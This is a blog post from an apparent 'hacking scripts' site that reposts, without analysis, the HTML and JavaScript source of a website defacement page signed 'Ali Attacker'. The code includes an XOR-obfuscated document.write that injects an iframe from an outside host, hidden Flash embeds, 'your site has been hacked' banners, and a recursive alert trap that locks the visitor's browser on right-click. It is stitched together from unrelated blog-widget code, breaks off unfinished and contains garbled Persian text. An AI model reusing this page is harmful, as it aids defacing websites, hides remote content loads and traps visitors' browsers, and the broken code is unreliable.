---
id: 151
title: Ali Attacker Hack Script
author: admin
layout: post
guid: http://hackingscripts.com/?p=151
permalink: /ali-attacker-hack-script/
categories:
  - Javascript
tags:
  - Javascript
---
This script looks incomplete and is not commented at all. It appears to have been coded by &#8216;Ali Attacker&#8217;.


### Ali Attacker Hack Script Source Code

<pre class="brush: jscript; title: ; notranslate" title="">function c_$(id){
        return document.getElementById(id);
    }

			if (parent.frames.length) top.location.href= document.location;

	setTodayDate = function(){
		document.write('?? ???? 16 ??? 1392');
		/*1293979*/	}


		<script>
	try{
		var commentCnt = new Array();
			} catch(e){}

	newComment = function(post_id){
		try{
			window.open('/post/comment/'+post_id,'comment','status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no ,width=480px,height=540px');
		} catch(e){}
	}
	setCommentCnt = function(post_id){
		try{
			if(commentCnt[post_id]){
				document.write(commentCnt[post_id]);
			} else {
				document.write(0);
			}
		} catch(e){}
	}
</script><script>

	statInfo = new Array();
	setStatVar = function(index,value){
		statInfo[index] = value;
	}
	getStatVar = function(index){
		if(statInfo[index]) document.write(statInfo[index]);
	}

	setStatVar('total_post','0');
	setStatVar('total_author','0');
	setStatVar('modify_date','?? ???? 16 ??? 1392');

	setStatVar('today_view','4');
	setStatVar('yesterday_view','1');

	setStatVar('this_month_view','10');
	setStatVar('last_month_view','0');

	setStatVar('total_view','10');
	setStatVar('last_view_date','?? ???? 16 ??? 1392 (18:10)');




</script><script>
	messageForm = function(post_id){
		try{
			window.open('/message','message','status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no ,width=480px,height=550px');
		} catch(e){}
	}
</script><script>
	linkdailyForm = function(){
		try{
			window.open('/linkdaily/new','linkdaily','status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no ,width=500px,height=460px');
		} catch(e){}
	}
</script><script>

var MihanblogShopAdsArray = new Array();

function GetMihanBlogShowAds(){
	if(MihanblogShopAdsArray.length){
		var adsTarget = 'MihanblogShopAds';
		var containerWidth = document.getElementById(adsTarget).offsetWidth;
		if(containerWidth>=200){
			var adsCnt = parseInt(containerWidth / 200) ;
			if(adsCnt>MihanblogShopAdsArray.length){
				adsCnt = MihanblogShopAdsArray.length ;
			}
//			var OneAdsWidth = parseInt(containerWidth / adsCnt) ;
			var OneAdsWidth = containerWidth / adsCnt ;
			if(OneAdsWidth>400){
				OneAdsWidth = 400 ;
			}
			var OutHtml = '';
			var img = '';
			var link = '';
			var title = '';
			var description = '';
			var imgWidth = 70;
			if(OneAdsWidth>230){
				imgWidth = 80;
			}
			if(OneAdsWidth>300){
				imgWidth = 90;
			}
			for(adsOne=0;adsOne<adsCnt;adsOne++){

				img = MihanblogShopAdsArray[adsOne]['img'];
				link = MihanblogShopAdsArray[adsOne]['link'];
				title = MihanblogShopAdsArray[adsOne]['title'];
				description = MihanblogShopAdsArray[adsOne]['description'];

				OutHtml += '<td style="background-color:#FFF;width: '+OneAdsWidth+'px;border:1px solid #f00;margin:0px 0px;font-size:11px;font-family:tahoma;padding:2px;margin:0px 0px;font-size:11px;border: 1px solid BurlyWood; padding: 1px; height: '+(imgWidth+25)+'px;">';

				OutHtml += '	<a href="'+link+'" target="_blank" style="text-decoration:none">';

				OutHtml += '			<div style="width: '+(OneAdsWidth-16)+'px;cursor:pointer;font-size:12px;padding: 4px 1px 4px 7px; white-space: nowrap; text-align: center; font-weight: bold; color: blue;white-space:nowrap;overflow:hidden">';
				OutHtml += 					title;
				OutHtml += '			</div>';
				OutHtml += '			<div style="cursor:pointer;padding: 1px; display: block; float: right; width: '+imgWidth+'px;">';
				OutHtml += '				<img src="'+img+'" style="border:0px;padding:0px;margin:0px;width:'+imgWidth+'px;height:'+imgWidth+'px;">';
				OutHtml += '			</div>';
				OutHtml += '			<div style="padding: 1px; display: block; float: right; width: '+(OneAdsWidth-13-imgWidth)+'px; text-align: right;overflow:hidden">';
				OutHtml += '				<div style="overflow:hidden;cursor:pointer;padding: 2px 3px; line-height: 17px; height: '+(imgWidth-3)+'px; text-align: justify;color:#000;direction:rtl">';
				OutHtml += 						description;
				OutHtml += '				</div>';
				OutHtml += '			</div>';

				OutHtml += '	</a>';

				OutHtml += '</td>';
			}

			var Out = '<table align="center" cellpadding="0" cellspacing="2" style="width:'+(OneAdsWidth*adsCnt)+'px;"><tr>'+OutHtml+'</tr></table>';

			Out = '<div style="text-align:center;padding:0px;margin:3px auto;">'+Out+'</div>';

			document.getElementById(adsTarget).style.height = (imgWidth+35)+'px' ;
			document.getElementById(adsTarget).innerHTML = Out ;
		}
	}
}
</script>

<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8" />
    <title> Hacked by Ali Attacker </title>
    <style>
       #frm{
         border:none;
         overflow:no-content;
         position:absolute;
         top:0;
         left:0;
         z-index:-100;
       }
       .wrapper{
          width:100%;
          height:100%;
          background:transparent;
          position:absolute;
          z-index:-99;
          top:0;
          left:0;
       }
       .sheet{
           position:static;
            width:900px;
           height:900px;
           background:rgba(0, 0, 0, 0.80);
           margin:50px auto;
           padding:20px;
       }
    </style>
</head>
<body>
<script>var enkripsi="'02'02'02'02'1Akdpcog'02qpa'1F'00jvvr'1C--`cn{cl,kp-fgom-pf,jvon'00'02qapmnnkle'1F'00lm'00'02jgkejv'1F'00332'07'00'02ukfvj'1F'00322'07'00'02kf'1F'00dpo'00'1G'1A-kdpcog'1G"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);</script>

<html>
<head>
<embed src="http://dl.balyan.ir/swf/03 The Road to Masysaf.swf" type="application/x-shockwave-flash" <="" embed="" height="0" width="0">
<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
<title>MR.VIRUS</title>
<link rel="shortcut icon" href="http://www.balyan.ir/wp-content/uploads/iran1.png" type="image/x-icon">
<head>

<center><embed color="FF0000" width="900" height="50" align="middle" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent" quality="high" src="http://dl.balyan.ir/swf/abc.swf" flashvars= "letter= Hacked by Ali Attacker " labelColor = "FF0000"><center>


<br>
<br>
<img src="http://s5.picofile.com/file/8108439684/hacked.jpg" align="center">
<br>
<script language="JavaScript">
TypingText = function(element, interval, cursor, finishedCallback) {
if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
this.running = true; // Never run.
return;
}
this.element = element;
this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
this.interval = (typeof interval == "undefined" ? 50 : interval);
this.origText = this.element.innerHTML;
this.unparsedOrigText = this.origText;
this.cursor = (cursor ? cursor : "");
this.currentText = "";
this.currentChar = 0;
this.element.typingText = this;
if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
TypingText.all.push(this);
this.running = false;
this.inTag = false;
this.tagBuffer = "";
this.inHTMLEntity = false;
this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
if(this.running) return;
if(typeof this.origText == "undefined") {
setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval); // We haven't finished loading yet. Have patience.
return;
}
if(this.currentText == "") this.element.innerHTML = "";
// this.origText = this.origText.replace(/<([^<])*>/, ""); // Strip HTML from text.
if(this.currentChar < this.origText.length) {
if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
this.tagBuffer = "<";
this.inTag = true;
this.currentChar++;
this.run();
return;
} else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
this.tagBuffer += ">";
this.inTag = false;
this.currentText += this.tagBuffer;
this.currentChar++;
this.run();
return;
} else if(this.inTag) {
this.tagBuffer += this.origText.charAt(this.currentChar);
this.currentChar++;
this.run();
return;
} else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
this.HTMLEntityBuffer = "&";
this.inHTMLEntity = true;
this.currentChar++;
this.run();
return;
} else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
this.HTMLEntityBuffer += ";";
this.inHTMLEntity = false;
this.currentText += this.HTMLEntityBuffer;
this.currentChar++;
this.run();
return;
} else if(this.inHTMLEntity) {
this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
this.currentChar++;
this.run();
return;
} else {
this.currentText += this.origText.charAt(this.currentChar);
}
this.element.innerHTML = this.currentText;
this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
this.currentChar++;
setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
} else {
this.currentText = "";
this.currentChar = 0;
this.running = false;
this.finishedCallback();
}
}
</script>
<style>
td{font-family: Annonying kettle; font-size: 9pt; color: red}
a{font-family: Annonying kettle; font-size: 12pt; color: white}
</style><center>
<div id="example1"></div>
<p id="example2">
<font color="green">
<br>Finding Vulnerability..................   Find :)<br>
<b>Bypassing Security...................  & Getting Access...................Defacing...=Done.......</b><br>
<b>You Got Owned By Ali Attacker.......     SORRY ADMIN....... Improve Ur Security............</b><br>
<b>Admin your Security is very  low your Site has been Hacked </b>
    <b>
<font face="courier new" size="3" color="red">
<br>Ali_Attacker@yahoo.com<br>
</font>
<font face="courier new" size="6" color="green" "=""><blink><b>YOUR DATABASE IS SAFE</b></blink></font>
<br><img src="http://dl.balyan.ir/image/yaTAF.gif" align="center">
</p></center>
<script type="text/javascript">
//Define first typing example:
new TypingText(document.getElementById("example1"));
//Define second typing example (use "slashing" cursor at the end):
new TypingText(document.getElementById("example2"), 50, function(i){
var ar = new Array("_"," ","_","_"); return " " + ar[i.length %
ar.length]; });
//Type out examples:
TypingText.runAll();
</script>
<script language="JavaScript" type="text/javascript">
<!--
var rows=1; // must be an odd number
var speed=150; // lower is faster
var reveal=2; // between 0 and 2 only. The higher, the faster the word appears
var effectalign="default" //enter "center" to center it.
var w3c=document.getElementById && !window.opera;;
var ie45=document.all && !window.opera;
var ma_tab, matemp, ma_bod, ma_row, x, y, columns, ma_txt, ma_cho;
var m_coch=new Array();
var m_copo=new Array();
function matrix() {
if (!w3c && !ie45) return
var matrix=(w3c)?document.getElementById("matrix"):document.all["matrix"];
ma_txt=(w3c)?matrix.firstChild.nodeValue:matrix.innerHTML;
ma_txt=" "+ma_txt+" ";
columns=ma_txt.length;
if (w3c) {
while (matrix.childNodes.length) matrix.removeChild(matrix.childNodes[0]);
ma_tab=document.createElement("table");
ma_tab.setAttribute("border", 0);
ma_tab.setAttribute("align", effectalign);
ma_tab.style.backgroundColor="#000000";
ma_bod=document.createElement("tbody");
for (x=0; x<rows; x++) {
ma_row=document.createElement("tr");
for (y=0; y<columns; y++) {
matemp=document.createElement("td");
matemp.setAttribute("id", "Mx"+x+"y"+y);
matemp.className="matrix";
matemp.appendChild(document.createTextNode(String.fromCharCode(160)));
ma_row.appendChild(matemp);
}
ma_bod.appendChild(ma_row);
}
ma_tab.appendChild(ma_bod);
matrix.appendChild(ma_tab);
} else {
ma_tab='<ta'+'ble align="'+effectalign+'" border="0" style="background-color:#000000">';
for (var x=0; x<rows; x++) {
ma_tab+='<t'+'r>';
for (var y=0; y<columns; y++) {
ma_tab+='<t'+'d class="matrix" id="Mx'+x+'y'+y+'">&nbsp;</'+'td>';
}
ma_tab+='</'+'tr>';
}
ma_tab+='</'+'table>';
matrix.innerHTML=ma_tab;
}
ma_cho=ma_txt;
for (x=0; x<columns; x++) {
ma_cho+=String.fromCharCode(32+Math.floor(Math.random()*94));
m_copo[x]=0;
}
ma_bod=setInterval("mytricks()", speed);
}

function mytricks() {
x=0;
for (y=0; y<columns; y++) {
x=x+(m_copo[y]==100);
ma_row=m_copo[y]%100;
if (ma_row && m_copo[y]<100) {
if (ma_row<rows+1) {
if (w3c) {
matemp=document.getElementById("Mx"+(ma_row-1)+"y"+y);
matemp.firstChild.nodeValue=m_coch[y];
}
else {
matemp=document.all["Mx"+(ma_row-1)+"y"+y];
matemp.innerHTML=m_coch[y];
}
matemp.style.color="#33ff66";
matemp.style.fontWeight="bold";
}
if (ma_row>1 && ma_row<rows+2) {
matemp=(w3c)?document.getElementById("Mx"+(ma_row-2)+"y"+y):document.all["Mx"+(ma_row-2)+"y"+y];
matemp.style.fontWeight="normal";
matemp.style.color="#00ff00";
}
if (ma_row>2) {
matemp=(w3c)?document.getElementById("Mx"+(ma_row-3)+"y"+y):document.all["Mx"+(ma_row-3)+"y"+y];
matemp.style.color="#009900";
}
if (ma_row<Math.floor(rows/2)+1) m_copo[y]++;
else if (ma_row==Math.floor(rows/2)+1 && m_coch[y]==ma_txt.charAt(y)) zoomer(y);
else if (ma_row<rows+2) m_copo[y]++;
else if (m_copo[y]<100) m_copo[y]=0;
}
else if (Math.random()>0.9 && m_copo[y]<100) {
m_coch[y]=ma_cho.charAt(Math.floor(Math.random()*ma_cho.length));
m_copo[y]++;
}
}
if (x==columns) clearInterval(ma_bod);
}

function zoomer(ycol) {
var mtmp, mtem, ytmp;
if (m_copo[ycol]==Math.floor(rows/2)+1) {
for (ytmp=0; ytmp<rows; ytmp++) {
if (w3c) {
mtmp=document.getElementById("Mx"+ytmp+"y"+ycol);
mtmp.firstChild.nodeValue=m_coch[ycol];
}
else {
mtmp=document.all["Mx"+ytmp+"y"+ycol];
mtmp.innerHTML=m_coch[ycol];
}
mtmp.style.color="#33ff66";
mtmp.style.fontWeight="bold";
}
if (Math.random()<reveal) {
mtmp=ma_cho.indexOf(ma_txt.charAt(ycol));
ma_cho=ma_cho.substring(0, mtmp)+ma_cho.substring(mtmp+1, ma_cho.length);
}
if (Math.random()<reveal-1) ma_cho=ma_cho.substring(0, ma_cho.length-1);
m_copo[ycol]+=199;
setTimeout("zoomer("+ycol+")", speed);
}
else if (m_copo[ycol]>200) {
if (w3c) {
mtmp=document.getElementById("Mx"+(m_copo[ycol]-201)+"y"+ycol);
mtem=document.getElementById("Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol);
}
else {
mtmp=document.all["Mx"+(m_copo[ycol]-201)+"y"+ycol];
mtem=document.all["Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol];
}
mtmp.style.fontWeight="normal";
mtem.style.fontWeight="normal";
setTimeout("zoomer("+ycol+")", speed);
}
else if (m_copo[ycol]==200) m_copo[ycol]=100+Math.floor(rows/2);
if (m_copo[ycol]>100 && m_copo[ycol]<200) {
if (w3c) {
mtmp=document.getElementById("Mx"+(m_copo[ycol]-101)+"y"+ycol);
mtmp.firstChild.nodeValue=String.fromCharCode(160);
mtem=document.getElementById("Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol);
mtem.firstChild.nodeValue=String.fromCharCode(160);
}
else {
mtmp=document.all["Mx"+(m_copo[ycol]-101)+"y"+ycol];
mtmp.innerHTML=String.fromCharCode(160);
mtem=document.all["Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol];
mtem.innerHTML=String.fromCharCode(160);
}
setTimeout("zoomer("+ycol+")", speed);
}

}
// -->
setTimeout('matrix()', 1);

col=0;
function fadein()
{
document.getElementById("fade1").style.color="rgb(" + col + ",0,0)";
document.getElementById("fade2").style.color="rgb(" + col + ",0,0)";
document.getElementById("fade3").style.color="rgb(" + col + ",0,0)";
document.getElementById("fade4").style.color="rgb(" + col + ",0,0)";
document.getElementById("fade5").style.color="rgb(" + col + ",0,0)";
document.getElementById("fade6").style.color="rgb(" + col + ",0,0)";
col+=5;
if(col<255) setTimeout('fadein()', 1);
if(col==255) setTimeout('fadeout()', 1);
}

function fadeout()
{
document.getElementById("fade1").style.color="rgb(" + col + ",0,0)";
document.getElementById("fade2").style.color="rgb(" + col + ",0,0)";
document.getElementById("fade3").style.color="rgb(" + col + ",0,0)";
document.getElementById("fade4").style.color="rgb(" + col + ",0,0)";
document.getElementById("fade5").style.color="rgb(" + col + ",0,0)";
document.getElementById("fade6").style.color="rgb(" + col + ",0,0)";
col-=5;
if(col>0) setTimeout('fadeout()', 1);
if(col==0) setTimeout('fadein()', 1)

    </div>
</body>
</html><script>
//    setTimeout(function () {
//        GetMihanBlogShowAds();
//    }, 1000);
</script>
<!--NEW SERVER--><!--;)-->

<script type="text/javascript">

    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-153829-9']);
    _gaq.push(['_setDomainName', 'mihanblog.com']);
    _gaq.push(['_trackPageview']);

    (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();

</script>

<SCRIPT>
farbbibliothek = new Array();
farbbibliothek[0] = new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100");
farbbibliothek[1] = new Array("#00FF00","#000000","#00FF00","#00FF00");
farbbibliothek[2] = new Array("#00FF00","#FF0000","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00");
farbbibliothek[3] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040");
farbbibliothek[4] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");
farbbibliothek[5] = new Array("#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF");
farbbibliothek[6] = new Array("#0000FF","#FFFF00");
farben = farbbibliothek[4];
function farbschrift()
{
for(var i=0 ; i<Buchstabe.length; i++)
{
document.all["a"+i].style.color=farben[i];
}
farbverlauf();
}
function string2array(text)
{
Buchstabe = new Array();
while(farben.length<text.length)
{
farben = farben.concat(farben);
}
k=0;
while(k<=text.length)
{
Buchstabe[k] = text.charAt(k);
k++;
}
}
function divserzeugen()
{
for(var i=0 ; i<Buchstabe.length; i++)
{
document.write("<font face='monotype corsiva' size=30><span id='a"+i+"' class='a"+i+"'>"+Buchstabe[i] + "</span></font>");
}
farbschrift();
}
var a=1;
function farbverlauf()
{
for(var i=0 ; i<farben.length; i++)
{
farben[i-1]=farben[i];
}
farben[farben.length-1]=farben[-1];

setTimeout("farbschrift()",30);
}
// Zu Demonstrationszwecken*****************
var farbsatz=1;
function farbtauscher()
{
farben = farbbibliothek[farbsatz];
while(farben.length<text.length)
{
farben = farben.concat(farben);
}
farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001));
}
setInterval("farbtauscher()",5000);
text= "Admin Sorry Your Security Is Low Your site Has Been Hacked  "; //h
string2array(text);
divserzeugen();
//document.write(text);
</SCRIPT>
<br>
<br>
<br>
<img src="http://s5.picofile.com/file/8108441026/co1674.jpg" align="center">
<br>
<marquee
scrollamount="4"
scrolldelay="10"
style="border:0px solid #99FF00;
font-family: B tahoma;
background-color:#FF6600;
font-size:16pt;
color: black"
direction="lifet">
<font color="#CCFF00">

-Hacker Of The Golestan-

</font>

</MARQUEE>







<SCRIPT language=JavaScript>
document.onmousedown=click
var times=0
var times2=10
function click() {
if ((event.button==2) || (event.button==3)) {
if (times>=1) { bye() }
alert("ÏÇÑí ÏÒÏí ãí ˜äí ...¿¿¿   Çíä ˜ÇÑæ ä˜ä ÚÒíÒ Ïá ÈÑÇÏÑ ÖÑÒ ãí ˜äí ...ÇÒ ãä ÝÊä..");
times++ } }
function bye() {
alert("ãä ˜å ÝÊã ˜áí˜ ä˜ä... ÍÇáÇ ÑíÓÊ ˜ä ÓíÓÊãÊ Ñæ  ÊÇÍÇáÊ ÑÝÊå Ôå !");
bye() }
</SCRIPT>

<script language="JavaScript1.2">
function disableselect(e){
return false
}function reEnable(){
return true
}document.onselectstart=new Function ("return false")
if (window.sidebar){
document.onmousedown=disableselect
document.onclick=reEnable
}</script>

<center>
<script>
</pre>
